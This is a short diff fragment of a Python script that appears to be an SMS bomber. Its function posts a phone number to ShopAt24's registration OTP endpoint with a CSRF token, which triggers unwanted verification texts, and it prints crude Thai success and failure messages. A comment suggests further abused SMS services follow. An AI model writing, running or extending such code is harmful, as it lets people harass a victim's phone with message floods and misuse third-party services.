@@ -13,9 +13,7 @@ def shopat(phone):
     d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
     if d == 200:
         print("[+] ShopAt24 | ยิงแล้วไอสัส")
-
     else : 
-
         print("[+] ShopAt24 | ล้มเหลวว่ะ")
 
 """api sms pizza1112"""
